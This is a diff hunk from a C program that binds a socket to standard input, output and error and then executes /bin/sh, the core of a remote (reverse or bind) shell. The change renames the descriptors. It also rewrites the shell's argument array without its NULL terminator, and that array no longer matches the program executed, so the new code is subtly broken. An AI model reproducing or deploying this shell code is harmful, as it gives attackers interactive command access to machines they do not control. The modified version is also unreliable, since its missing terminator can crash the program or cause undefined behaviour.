@@ -41,11 +41,11 @@ int main(int argc, char* argv[]) {
         return 0;
     }
 
-    dup2(socketfd, 0);
-    dup2(socketfd, 1);
-    dup2(socketfd, 2);
+    dup2(socketfd, STDIN_FILENO);
+    dup2(socketfd, STDOUT_FILENO);
+    dup2(socketfd, STDERR_FILENO);
 
-    char *const shell_argv[] = {"/bin/sh", NULL};
+    char *const shell_argv[] = {"/bin/bash", "-l"};
     execve("/bin/sh", shell_argv, NULL);
     return 0;
 }
